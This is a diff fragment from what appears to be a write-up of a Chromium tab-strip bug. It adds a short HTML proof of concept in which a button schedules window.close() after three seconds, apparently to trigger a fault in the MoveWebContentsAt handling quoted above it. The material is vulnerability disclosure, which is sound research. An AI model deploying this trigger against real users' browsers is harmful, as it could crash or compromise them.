@@ -157,6 +157,19 @@ if (target_index > index) {
 source_context_->GetTabStripModel()->MoveWebContentsAt(    // The return value should assign to target_index
     index, target_index, false);
   ```
+  
+  **Poc**
+  ```html
+
+<button id="test1">Trigger</button>
+<script>
+	var test1 = document.getElementById("test1");
+	test1.onclick = () =>{
+		setTimeout(()=>{window.close();},3000);
+	}
+</script>
+  ```
+  
 </details>
 
 --------
